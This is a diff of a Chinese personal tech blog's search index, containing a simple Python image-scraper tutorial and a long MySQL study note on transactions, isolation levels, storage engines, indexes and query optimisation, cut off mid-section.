-    file_name = url.split(<span class="hljs-string">&#x27;/&#x27;</span>)[-<span class="hljs-number">1</span>]    <span class="hljs-comment">#保存图片的名字</span>
-
-    res = requests.get(url, headers = head)   <span class="hljs-comment">#依此访问图片链接</span>
-    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-built_in">dir</span>+<span class="hljs-string">&#x27;/&#x27;</span>+file_name, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:   <span class="hljs-comment">#以二进制形式保存图片</span>
-        f.write(res.content)</code></pre>
-
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>爬虫</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>木马</title>
     <url>/2020/07/18/%E6%9C%A8%E9%A9%AC/</url>
     <content><![CDATA[<h1 id="初识木马"><a href="#初识木马" class="headerlink" title="初识木马"></a>初识木马</h1><span id="more"></span>
@@ -5392,6 +5343,56 @@ E#---
       <categories>
         <category>c++</category>
       </categories>
+  </entry>
+  <entry>
+    <title>爬图</title>
+    <url>/2020/07/18/%E7%88%AC%E5%9B%BE/</url>
+    <content><![CDATA[<h1 id="用爬虫爬取小姐姐的图片"><a href="#用爬虫爬取小姐姐的图片" class="headerlink" title="用爬虫爬取小姐姐的图片"></a>用爬虫爬取小姐姐的图片</h1><span id="more"></span>
+<p><strong>用的库</strong></p>
+<pre><code class="hljs applescript">re <span class="hljs-comment">#正则表达式</span>
+requests <span class="hljs-comment">#url请求</span>
+<span class="hljs-built_in">time</span>   <span class="hljs-comment">#时间</span>
+os     <span class="hljs-comment">#用于创建文件夹，保存图片</span></code></pre>
+<p>##准备工作<br>1.首先访问该链接<br><code>https://www.vmgirls.com/</code><br>2.随便点击一个进入查看详情<br><code>https://www.vmgirls.com/13344.html</code><br>3.F12审查元素网查看页详情，主要查看图片链接的标签位置，写出正则表达式<br><img src="https://i.loli.net/2020/12/04/49X1BbloChqFsic.png" alt="1"><br>该正则表达式为<code>findlinks = &#39;&lt;a href=&quot;(.*?)&quot; alt=&quot;.*?&quot; title=&quot;.*?&quot;&gt;&#39;</code></p>
+<h2 id="完整程序"><a href="#完整程序" class="headerlink" title="完整程序"></a>完整程序</h2><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
+<span class="hljs-comment">#@Time : 2020/7/16 13:36</span>
+<span class="hljs-comment">#@Author : sunzy</span>
+<span class="hljs-comment">#@File : tupian.py</span>
+<span class="hljs-keyword">import</span> re
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> time
+<span class="hljs-keyword">import</span> os
+
+<span class="hljs-built_in">dir</span> = <span class="hljs-string">&quot;plmm&quot;</span>        <span class="hljs-comment">#文件夹名字</span>
+<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-built_in">dir</span>):   <span class="hljs-comment">#首先判断是否存在当前文件夹如果没有则创建一个</span>
+    os.mkdir(<span class="hljs-built_in">dir</span>)
+<span class="hljs-comment"># 模仿浏览器的首部信息，绕过一些网站的反爬取措施</span>
+head = &#123;
+        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61&quot;</span>
+    &#125;
+
+url = <span class="hljs-string">&quot;https://www.vmgirls.com/13344.html&quot;</span>
+response = requests.get(url, headers = head)   <span class="hljs-comment"># 访问目标网页，获取网页内容</span>
+html = response.text
+
+findlinks = <span class="hljs-string">&#x27;&lt;a href=&quot;(.*?)&quot; alt=&quot;.*?&quot; title=&quot;.*?&quot;&gt;&#x27;</span>
+urls = re.findall(findlinks, html)   <span class="hljs-comment">#爬取到的图片链接保存在urls中， 是一个列表</span>
+
+<span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:
+    time.sleep(<span class="hljs-number">1</span>)    <span class="hljs-comment">#防止访问速度过快使服务器崩溃</span>
+    file_name = url.split(<span class="hljs-string">&#x27;/&#x27;</span>)[-<span class="hljs-number">1</span>]    <span class="hljs-comment">#保存图片的名字</span>
+
+    res = requests.get(url, headers = head)   <span class="hljs-comment">#依此访问图片链接</span>
+    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-built_in">dir</span>+<span class="hljs-string">&#x27;/&#x27;</span>+file_name, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:   <span class="hljs-comment">#以二进制形式保存图片</span>
+        f.write(res.content)</code></pre>
+
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>爬虫</tag>
+      </tags>
   </entry>
   <entry>
     <title>综合2</title>
@@ -6166,6 +6167,570 @@ cursor.close()</code></pre>
       </categories>
       <tags>
         <tag>朴素贝叶斯</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MySql进阶学习</title>
+    <url>/2022/09/27/mysql/</url>
+    <content><![CDATA[<h1 id="Mysql进阶学习"><a href="#Mysql进阶学习" class="headerlink" title="Mysql进阶学习"></a>Mysql进阶学习</h1><h2 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h2><blockquote>
+<p>事务 是一组操作的集合，它是一个不可分割的工作单位，事务会把所有的操作作为一个整体一起向系</p>
+<p>统提交或撤销操作请求，即这些操作要么同时成功，要么同时失败。</p>
+<p>就比如: 张三给李四转账1000块钱，张三银行账户的钱减少1000，而李四银行账户的钱要增加</p>
+<p>1000。 这一组操作就必须在一个事务的范围内，要么都成功，要么都失败。</p>
+</blockquote>
+<p>数据的准备</p>
+<pre><code class="hljs mysql">drop table if exists account;
+create table account
+(
+    id    int primary key AUTO_INCREMENT comment &#39;ID&#39;,
+    name  varchar(10) comment &#39;姓名&#39;,
+    money double(10, 2) comment &#39;余额&#39;
+) comment &#39;账户表&#39;;
+insert into account(name, money)
+VALUES (&#39;张三&#39;, 2000),
+       (&#39;李四&#39;, 2000);</code></pre>
+
+
+
+<p>正常的操作下表数据的变化</p>
+<pre><code class="hljs mysql">select * from account;
+
+select * from account where name &#x3D; &#39;张三&#39;;
+
+update account set money &#x3D; money - 1000 where id &#x3D; 1;
+
+update account set money &#x3D; money + 1000 where id &#x3D; 2;</code></pre>
+
+
+
+<p>操作异常情况下的数据情况</p>
+<pre><code class="hljs mysql">update account set money &#x3D; money - 1000 where id &#x3D; 1;
+error
+update account set money &#x3D; money + 1000 where id &#x3D; 2;</code></pre>
+
+<p>在此情况下，第二句sql无法执行到</p>
+<p>这样就会导致张三用户账户的钱少了，但是李四账号并没有收到钱，那么就会出现问题。</p>
+<h3 id="手动控制事务"><a href="#手动控制事务" class="headerlink" title="手动控制事务"></a>手动控制事务</h3><p>1).查看/设置事务提交方式</p>
+<pre><code class="hljs mysql">select @@autocommit;
+
+set @@autocommit &#x3D; 0;</code></pre>
+
+<p><img src="/2022/09/27/mysql/OneDrive%20-%20cumt.edu.cn/LAB/note/mysql.assets/image-20220922154213267.png" alt="image-20220922154213267"></p>
+<p>2).提交事务</p>
+<pre><code class="hljs mysql">commit;</code></pre>
+
+<p>3).事务回滚</p>
+<pre><code class="hljs abnf">rollback<span class="hljs-comment">;</span></code></pre>
+
+<blockquote>
+<p>上面的过程是将事务的提交设置为手动提交，此时我们执行的DML语句都不会提交, 需要手动的执行commit进行提交。</p>
+</blockquote>
+<h3 id="自动控制事务"><a href="#自动控制事务" class="headerlink" title="自动控制事务"></a>自动控制事务</h3><p>1).开启事务</p>
+<pre><code class="hljs mysql">statr&#x2F;begin tranaction</code></pre>
+
+<p>2).提交事务</p>
+<pre><code class="hljs mysql">commit；</code></pre>
+
+<p>3).事务回滚</p>
+<pre><code class="hljs mysql">rollbock;</code></pre>
+
+<p>转账案例实现</p>
+<pre><code class="hljs mysql">start transaction;
+-- 从张三账户中转出钱
+update account set money &#x3D; money - 1000 where id &#x3D; 1;
+-- 向李四账号中转入钱
+update account set money &#x3D; money + 1000 where id &#x3D; 2;
+
+-- 执行完毕，提交事务
+commit;</code></pre>
+
+<h3 id="事务四大特性"><a href="#事务四大特性" class="headerlink" title="事务四大特性"></a>事务四大特性</h3><ul>
+<li><p>原子性（Atomicity）：事务是不可分割的最小操作单元，要么全部成功，要么全部失败。</p>
+</li>
+<li><p>一致性（Consistency）：事务完成时，必须使所有的数据都保持一致状态。</p>
+</li>
+<li><p>隔离性（Isolation）：数据库系统提供的隔离机制，保证事务在不受外部并发操作影响的独立</p>
+</li>
+</ul>
+<p>环境下运行。</p>
+<ul>
+<li>持久性（Durability）：事务一旦提交或回滚，它对数据库中的数据的改变就是永久的。</li>
+</ul>
+<p>上述就是事务的四大特性，简称ACID。 </p>
+<h3 id="并发事务产生的问题"><a href="#并发事务产生的问题" class="headerlink" title="并发事务产生的问题"></a>并发事务产生的问题</h3><p>1). 赃读：一个事务读到另外一个事务还没有提交的数据</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220922155417574.png" alt="image-20220922155417574"></p>
+<p>2). 不可重复读：一个事务先后读取同一条记录，但两次读取的数据不同，称之为不可重复读。</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220922155423618.png" alt="image-20220922155423618"></p>
+<p>3). 幻读：一个事务按照条件查询数据时，没有对应的数据行，但是在插入数据时，又发现这行数据</p>
+<p>已经存在，好像出现了 “幻影”。</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220922155433815.png" alt="image-20220922155433815"></p>
+<h3 id="事务的隔离级别"><a href="#事务的隔离级别" class="headerlink" title="事务的隔离级别"></a>事务的隔离级别</h3><p>为了解决事务并发产生的问题，在数据库中引入了事务隔离级别。主要有以下四种：</p>
+<table>
+<thead>
+<tr>
+<th>隔离级别</th>
+<th>脏读</th>
+<th>不可重复度</th>
+<th>幻读</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Read uncommited(读未提交)</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+</tr>
+<tr>
+<td>Read commited(读已提交)</td>
+<td>×</td>
+<td>√</td>
+<td>√</td>
+</tr>
+<tr>
+<td>Repeatable Read(默认)</td>
+<td>×</td>
+<td>×</td>
+<td>√</td>
+</tr>
+<tr>
+<td>Serializable(串行化)</td>
+<td>×</td>
+<td>×</td>
+<td>×</td>
+</tr>
+</tbody></table>
+<p>1). 查看事务的隔离级别</p>
+<pre><code class="hljs mysql">SELECT @@TRANSACTION_ISOLATION;</code></pre>
+
+<p>Mysql默认使用的是<code>Repeatable Read</code></p>
+<p><img src="/2022/09/27/mysql/OneDrive%20-%20cumt.edu.cn/LAB/note/mysql.assets/image-20220922160058646.png" alt="image-20220922160058646"></p>
+<p>2).设置事务隔离级别</p>
+<pre><code class="hljs mysql">SET [ SESSION | GLOBAL ] TRANSACTION ISOLATION LEVEL &#123; READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE &#125;
+
+-- session是设置当前会话即当前连接的终端的隔离级别
+-- GLOBAL是设置所有会话的隔离级别
+</code></pre>
+
+<blockquote>
+<p>注意：事务的隔离级别越高其性能越低</p>
+</blockquote>
+<h2 id="存储引擎"><a href="#存储引擎" class="headerlink" title="存储引擎"></a>存储引擎</h2><p>查看当前数据库支持的存储引擎</p>
+<pre><code class="hljs mysql">show engines</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220922150430705.png" alt="image-20220922150430705"></p>
+<p>当创建表时默认使用InnoDB存储引擎</p>
+<pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> tb_user;</code></pre>
+
+<p><img src="/2022/09/27/mysql/OneDrive%20-%20cumt.edu.cn/LAB/note/mysql.assets/image-20220922150801513.png" alt="image-20220922150801513"></p>
+<p>创建数据表时指定数据引擎，添加参数<code>engine=存储引擎名</code></p>
+<pre><code class="hljs mysql">create table my_myisam
+(
+    id   int,
+    name varchar(10)
+) engine &#x3D; MyISAM;
+
+
+create table my_myisam
+(
+    id   int,
+    name varchar(10)
+) engine &#x3D; Memory;</code></pre>
+
+<h3 id="InnoDB"><a href="#InnoDB" class="headerlink" title="InnoDB"></a><strong>InnoDB</strong></h3><p>1). 介绍</p>
+<p>InnoDB是一种兼顾高可靠性和高性能的通用存储引擎，在 MySQL 5.5 之后，InnoDB是默认的MySQL 存储引擎。</p>
+<p>2). 特点</p>
+<ul>
+<li>DML操作遵循ACID模型，支持事务；</li>
+<li>行级锁，提高并发访问性能；</li>
+<li>支持外键FOREIGN KEY约束，保证数据的完整性和正确性；</li>
+</ul>
+<p>3).逻辑存储结构</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220922151214606.png" alt="image-20220922151214606"></p>
+<h3 id="MyISAM"><a href="#MyISAM" class="headerlink" title="MyISAM"></a><strong>MyISAM</strong></h3><p>1). 介绍</p>
+<p>MyISAM是MySQL早期的默认存储引擎。</p>
+<p>2). 特点</p>
+<ul>
+<li><p>不支持事务，不支持外键</p>
+</li>
+<li><p>支持表锁，不支持行锁</p>
+</li>
+<li><p>访问速度快</p>
+</li>
+</ul>
+<h3 id="Memory"><a href="#Memory" class="headerlink" title="Memory"></a><strong>Memory</strong></h3><p>1). 介绍</p>
+<p>Memory引擎的表数据时存储在内存中的，由于受到硬件问题、或断电问题的影响，只能将这些表作为临时表或缓存使用。</p>
+<p>2). 特点</p>
+<ul>
+<li><p>内存存放</p>
+</li>
+<li><p>hash索引（默认）</p>
+</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220922151341240.png" alt="image-20220922151341240"></p>
+<blockquote>
+<p>面试题:</p>
+<p>InnoDB引擎与MyISAM引擎的区别 ? </p>
+<p>①. InnoDB引擎, 支持事务, 而MyISAM不支持。</p>
+<p>②. InnoDB引擎, 支持行锁和表锁, 而MyISAM仅支持表锁, 不支持行锁。</p>
+<p>③. InnoDB引擎, 支持外键, 而MyISAM是不支持的。</p>
+<p>主要是上述三点区别，当然也可以从索引结构、存储限制等方面，更加深入的回答，具体参</p>
+<p>考如下官方文档：</p>
+<p><strong><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-introduction.html">https://dev.mysql.com/doc/refman/8.0/en/innodb-introduction.html</a></strong></p>
+<p><strong><a href="https://dev.mysql.com/doc/refman/8.0/en/myisam-storage-engine.html">https://dev.mysql.com/doc/refman/8.0/en/myisam-storage-engine.html</a></strong></p>
+</blockquote>
+<p><strong>存储引擎的选择</strong></p>
+<p>在选择存储引擎时，应该根据应用系统的特点选择合适的存储引擎。</p>
+<ul>
+<li>InnDB:是mysql的默认存储引擎，支持事务、外键。如果应用对事务的完整性要求比较高，在并发条件下要求数据的一致性的情况下应该选择此存储引擎。</li>
+<li>MyISAM: 如果应用是以读取和插入操作为主 ，只有少量的删除和更新操作，并且对事务的完整性，并发性要求不是很高，那么选择此存储引擎合适</li>
+<li>Memory: 将所有数据保存在内存中， 访问速度快，通常用于临时表和缓存。但是由于存放在内存中其受到的限制也很多，如表的大小限制，无法对过大的表进行缓存，还有安全性问题，如断电时数据丢失。</li>
+</ul>
+<h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p><strong>介绍</strong></p>
+<blockquote>
+<p>索引（index）是帮助MySQL高效获取数据的数据结构(有序)。在数据之外，数据库系统还维护着满足</p>
+<p>特定查找算法的数据结构，这些数据结构以某种方式引用（指向）数据， 这样就可以在这些数据结构</p>
+<p>上实现高级查找算法，这种数据结构就是索引。</p>
+</blockquote>
+<h3 id="索引结构"><a href="#索引结构" class="headerlink" title="索引结构"></a><strong>索引结构</strong></h3><p>MySQL的索引是在存储引擎层实现的，不同的存储引擎有不同的索引结构，主要包含以下几种：</p>
+<table>
+<thead>
+<tr>
+<th>索引结构</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>B+tree</td>
+<td>最常见的索引类型，大部分引擎都支持 B+ 树索引</td>
+</tr>
+<tr>
+<td>Hash索引</td>
+<td>底层数据结构是用哈希表实现的, 只有精确匹配索引列的查询才有效, 不支持范围查询</td>
+</tr>
+<tr>
+<td>R-tree(空间索引）</td>
+<td>空间索引是MyISAM引擎的一个特殊索引类型，主要用于地理空间数据类型，通常使用较少</td>
+</tr>
+<tr>
+<td>Full-text(全文索引)</td>
+<td>是一种通过建立倒排索引,快速匹配文档的方式。类似于Lucene,Solr,ES</td>
+</tr>
+</tbody></table>
+<p>存储引擎对于索引结构的支持情况</p>
+<table>
+<thead>
+<tr>
+<th>索引</th>
+<th>InnoDB</th>
+<th>MyISAM</th>
+<th>Memory</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>B+tree</td>
+<td>支持</td>
+<td>支持</td>
+<td>支持</td>
+</tr>
+<tr>
+<td>Hash索引</td>
+<td>不支持</td>
+<td>不支持</td>
+<td>支持</td>
+</tr>
+<tr>
+<td>R-tree</td>
+<td>不支持</td>
+<td>支持</td>
+<td>不支持</td>
+</tr>
+<tr>
+<td>Full-text</td>
+<td>5.6版本之后支持</td>
+<td>支持</td>
+<td>不支持</td>
+</tr>
+</tbody></table>
+<h3 id="B-tree"><a href="#B-tree" class="headerlink" title="B-tree"></a>B-tree</h3><blockquote>
+<p>B-Tree，B树是一种多叉路衡查找树，相对于二叉树，B树每个节点可以有多个分支，即多叉。以一颗最大度数（max-degree）为5(5阶)的b-tree为例，那这个B树每个节点最多存储4个key，5个指针</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220922171802873.png" alt="image-20220922171802873"></p>
+<h3 id="B-Tree"><a href="#B-Tree" class="headerlink" title="B+Tree"></a>B+Tree</h3><blockquote>
+<p>B+Tree是B-Tree的变种，我们以一颗最大度数（max-degree）为4（4阶）的b+tree为例，其结构示意图：</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220922171908681.png" alt="image-20220922171908681"></p>
+<ul>
+<li>绿色框框起来的部分，是索引部分，仅仅起到索引数据的作用，不存储数据。</li>
+<li>红色框框起来的部分，是数据存储部分，在其叶子节点中要存储具体的数据。</li>
+</ul>
+<p>B+Tree 与 B-Tree相比，主要有以下三点区别：</p>
+<ul>
+<li><p>所有的数据都会出现在叶子节点。</p>
+</li>
+<li><p>叶子节点形成一个单向链表。</p>
+</li>
+<li><p>非叶子节点仅仅起到索引数据作用，具体的数据都是在叶子节点存放的。</p>
+</li>
+</ul>
+<p>MySQL索引数据结构对经典的B+Tree进行了优化。在原B+Tree的基础上，增加一个指向相邻叶子节点</p>
+<p>的链表指针，就形成了带有顺序指针的B+Tree，提高区间访问的性能，利于排序。</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220923112657769.png" alt="image-20220923112657769"></p>
+<h3 id="Hash索引"><a href="#Hash索引" class="headerlink" title="Hash索引"></a>Hash索引</h3><p>哈希索引就是采用一定的hash算法，将键值换算成新的hash值，映射到对应的槽位上，然后存储在hash表中。Java中的HashMap结构类似(树加链表的实现方式)。如果两个(或多个)键值，映射到一个相同的槽位上，他们就产生了hash冲突（也称为hash碰撞），可以通过链表来解决。</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220923113007344.png" alt="image-20220923113007344"></p>
+<p>特点</p>
+<ul>
+<li><p>Hash索引只能用于对等比较(=，in)，不支持范围查询（between，&gt;，&lt; ，…）</p>
+</li>
+<li><p>无法利用索引完成排序操作</p>
+</li>
+<li><p>查询效率高，通常(不存在hash冲突的情况)只需要一次检索就可以了，效率通常要高于B+tree索 引</p>
+</li>
+</ul>
+<blockquote>
+<p>为什么InnDB选择B+Tree作为索引结构</p>
+<ul>
+<li>相比较二叉树，其层级更少，搜索效率更高</li>
+<li>于B-tree，无论是叶子节点还是非叶子节点，都会保存数据，这样导致一页中存储的键值减少，指针跟着减少，要同样保存大量数据，只能增加树的高度，导致性能降低；</li>
+<li>相对Hash索引，B+tree支持范围匹配及排序操作</li>
+</ul>
+</blockquote>
+<h2 id="索引分类"><a href="#索引分类" class="headerlink" title="索引分类"></a>索引分类</h2><p>在MySQL数据库，将索引的具体类型主要分为以下几类：主键索引、唯一索引、常规索引、全文索引。</p>
+<table>
+<thead>
+<tr>
+<th>分类</th>
+<th>含义</th>
+<th>特点</th>
+<th>关键字</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>主键索引</td>
+<td>针对表中主键创建的索引</td>
+<td>默认自动创建，只能有一个</td>
+<td>primary</td>
+</tr>
+<tr>
+<td>唯一索引</td>
+<td>避免表中某 数据列的值重复</td>
+<td>可以有多个</td>
+<td>UNIQUE</td>
+</tr>
+<tr>
+<td>常规索引</td>
+<td>快速定位数据</td>
+<td>可以有多个</td>
+<td></td>
+</tr>
+<tr>
+<td>全文索引</td>
+<td>全文索引查找的是文中的关键字，而不是比较索引的值</td>
+<td>可以有多个</td>
+<td>FULLTEXT</td>
+</tr>
+</tbody></table>
+<h3 id="聚集索引和二级索引"><a href="#聚集索引和二级索引" class="headerlink" title="聚集索引和二级索引"></a>聚集索引和二级索引</h3><p>InnDB存储引擎中，根据索引的存储形式，又可以分为以下两种：</p>
+<table>
+<thead>
+<tr>
+<th>分类</th>
+<th>含义</th>
+<th>特点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>聚集索引(Clustered Index)</td>
+<td>将数据存储与索引放到一块，索引结构的叶子节点保存到行数据</td>
+<td>必须有且只有一个</td>
+</tr>
+<tr>
+<td>二级索引</td>
+<td>将数据与索引分开存储，索引结构的叶子节点关联是对应的主键</td>
+<td>可以 存放很多个</td>
+</tr>
+</tbody></table>
+<p>聚集索引选取规则：</p>
+<ul>
+<li>如果存在主键，主键索引就是聚集索引</li>
+<li>如果不存在主键，将使用第一个唯一(UNIQUE)索引作为聚集索引</li>
+<li>如果表没有主键，或没有合适的唯一索引，则InnoDB会自动生成一个rowid作为隐藏的聚集索引。</li>
+</ul>
+<p>聚集索引与二级索引的结构如下：</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220923121417420.png" alt="image-20220923121417420"></p>
+<p>当执行</p>
+<pre><code class="hljs mysql">select * from user where name &#x3D; &#39;Arm&#39;;</code></pre>
+
+<p>通过二级索引获取到其对应的主键索引，再到聚集索引中获取所有的行数据，这种查询过程叫做回表查询。</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220923121626216.png" alt="image-20220923121626216"></p>
+<p>上述查询详细查询过程如下：</p>
+<ul>
+<li><p>由于是根据name字段进行查询，所以先根据name=’Arm’到name字段的二级索引中进行匹配查找。但是在二级索引中只能查找到 Arm 对应的主键值 10。</p>
+</li>
+<li><p>由于查询的字段是*，二级索引中没有该字段，所以此时需要根据二级索引中存储的主键id = 10去聚集索引中查询</p>
+</li>
+<li><p>最后获取主键为10的行，返回所有数据</p>
+</li>
+</ul>
+<p>InnoDB存储引擎最小的存储单元-页(16K)，那么高度为2的B+tree树能存储多少条数据？</p>
+<blockquote>
+<p>这里我们<code>先假设B+树高为2</code>，即存在一个根节点和若干个叶子节点，那么这棵B+树的存放总记录数为：根节点指针数*单个叶子节点记录行数。</p>
+<p>上文我们已经说明单个叶子节点（页）中的记录数=16K/1K=16。（这里假设一行记录的数据大小为1k，<code>实际上</code>现在很多互联网业务<code>数据记录大小通常就是1K左右</code>）。</p>
+<p>那么现在我们需要计算出<code>非叶子节点能存放多少指针</code>，其实这也很好算，我们假设<code>主键ID为bigint类型，长度为8字节</code>，而<code>指针大小</code>在InnoDB源码中设置为<code>6字节</code>，这样一共14字节，我们一个页中能存放多少这样的单元，其实就代表有多少指针，即<code>16384/14=1170</code>。那么可以算出一棵<code>高度为2的B+树</code>，能存放<code>1170*16=18720条</code>这样的数据记录。</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220923124545908.png" alt="image-20220923124545908"></p>
+</blockquote>
+<h3 id="索引语法"><a href="#索引语法" class="headerlink" title="索引语法"></a>索引语法</h3><p>1) 创建索引</p>
+   <pre><code class="hljs mysql">CREATE [ UNIQUE | FULLTEXT ] INDEX index_name ON table_name ( index_col_name,... );</code></pre>
+
+<p>2) 查看索引</p>
+   <pre><code class="hljs mysql">show INDEX in account;</code></pre>
+
+<p>3) 删除索引</p>
+   <pre><code class="hljs mysql">DROP INDEX index_name ON table_name ;</code></pre>
+
+<p>索引的使用</p>
+<ul>
+<li><p>name字段为姓名字段，该字段的值可能会重复，为该字段创建索引</p>
+<pre><code class="hljs mysql">CREATE INDEX idx_user_name ON tb_user(name);</code></pre>
+</li>
+<li><p>phone手机号字段的值，是非空，且唯一的，为该字段创建唯一索引。</p>
+<pre><code class="hljs mysql">CREATE UNIQUE INDEX  idx_user_phone ON tb_user(phone);</code></pre>
+</li>
+<li><p>为profession、age、status创建联合索引。</p>
+<pre><code class="hljs mysql">CREATE INDEX idx_user_profession_age_status ON tb_user(profession, age, status);</code></pre>
+</li>
+<li><p>为email建立合适的索引来提升查询效率</p>
+<pre><code class="hljs mysql">CREATE INDEX idx_user_email ON tb_user(email);</code></pre>
+
+</li>
+</ul>
+<p>查看表中已创建的索引</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220923130559040.png" alt="image-20220923130559040"></p>
+<h2 id="SQL性能分析"><a href="#SQL性能分析" class="headerlink" title="SQL性能分析"></a>SQL性能分析</h2><h3 id="SQL的执行频次"><a href="#SQL的执行频次" class="headerlink" title="SQL的执行频次"></a>SQL的执行频次</h3><pre><code class="hljs mysql">SHOW GLOBAL  STATUS LIKE &#39;Com_____&#39;;
+SHOW SESSION  STATUS LIKE &#39;Com_____&#39;;</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220923131257200.png" alt="image-20220923131257200"></p>
+<h3 id="慢查询日志"><a href="#慢查询日志" class="headerlink" title="慢查询日志"></a>慢查询日志</h3><p>慢查询日志记录了所有执行时间超过指定参数（long_query_time，单位：秒，默认10秒）的所有SQL语句的日志。</p>
+<p>MySQL的慢查询日志默认没有开启，我们可以查看一下系统变量 slow_query_log。</p>
+<p>开启<code>slow_query_log</code>(默认关闭)，在mysql配置文件中添加以下配置</p>
+<pre><code class="hljs ini"><span class="hljs-attr">slow_query_log</span> = <span class="hljs-number">1</span> 
+<span class="hljs-attr">long_query_time</span>= <span class="hljs-number">2</span> <span class="hljs-comment"># 当查询时间超过两秒时，会被记录</span></code></pre>
+
+
+
+<h3 id="profile详情"><a href="#profile详情" class="headerlink" title="profile详情"></a>profile详情</h3><p>show profiles 能够在做SQL优化时帮助我们了解时间都耗费到哪里去了。通过have_profiling参数，能够看到当前MySQL是否支持profile操作：</p>
+<pre><code class="hljs mysql">SHOW @@hava_profiling;</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220923132917533.png" alt="image-20220923132917533"></p>
+<p>如果没有开启，则可以使用以下语句开启</p>
+<pre><code class="hljs mysql">set profiling  &#x3D; 1</code></pre>
+
+<p>执行一系列的业务SQL的操作，然后通过如下指令查看指令的执行耗时：</p>
+<pre><code class="hljs mysql">-- 查看每一条SQL的耗时基本情况 
+show profiles; 
+-- 查看指定query_id的SQL语句各个阶段的耗时情况 
+show profile for query query_id; 
+-- 查看指定query_id的SQL语句CPU的使用情况 
+show profile cpu for query query_id;</code></pre>
+
+<h3 id="最左前缀法则"><a href="#最左前缀法则" class="headerlink" title="最左前缀法则"></a>最左前缀法则</h3><p>如果索引了多列（联合索引），要遵守最左前缀法则。最左前缀法则指的是查询从索引的最左列开始，并且不跳过索引中的列。如果跳跃某一列，索引将会部分失效(后面的字段索引失效)。</p>
+<h3 id="覆盖索引"><a href="#覆盖索引" class="headerlink" title="覆盖索引"></a>覆盖索引</h3><p>尽量使用覆盖索引，减少select *。 那么什么是覆盖索引呢？ 覆盖索引是指 查询使用了索引，并且需要返回的列，在该索引中已经全部能够找到 。</p>
+<p>使用覆盖索引可以避免回表查询，提高sql查询的效率。</p>
+<h3 id="索引设计原则"><a href="#索引设计原则" class="headerlink" title="索引设计原则"></a>索引设计原则</h3><blockquote>
+<p>1). 针对于数据量较大，且查询比较频繁的表建立索引。</p>
+<p>2). 针对于常作为查询条件（where）、排序（order by）、分组（group     by）操作的字段建立索引。</p>
+<p>3). 尽量选择区分度高的列作为索引，尽量建立唯一索引，区分度越高，使用索引的效率越高。</p>
+<p>4). 如果是字符串类型的字段，字段的长度较长，可以针对于字段的特点，建立前缀索引。</p>
+<p>5). 尽量使用联合索引，减少单列索引，查询时，联合索引很多时候可以覆盖索引，节省存储空间，避免回表，提高查询效率。</p>
+<p>6). 要控制索引的数量，索引并不是多多益善，索引越多，维护索引结构的代价也就越大，会影响增删改的效率。</p>
+<p>create unique index idx_user_phone_name on tb_user(phone,name); </p>
+<p>7). 如果索引列不能存储NULL值，请在创建表时使用NOT NULL约束它。当优化器知道每列是否包含NULL值时，它可以更好地确定哪个索引最有效地用于查询。</p>
+</blockquote>
+<h2 id="SQL优化"><a href="#SQL优化" class="headerlink" title="SQL优化"></a>SQL优化</h2><h3 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h3><p>如果我们需要一次性往数据库表中插入多条记录，可以从以下三个方面进行优化。</p>
+<ul>
+<li><p>1). 优化方案一</p>
+<pre><code>批量插入数据</code></pre></li>
+<li><p>2). 优化方案二</p>
+<pre><code>手动控制事务</code></pre></li>
+<li><p>3). 优化方案三</p>
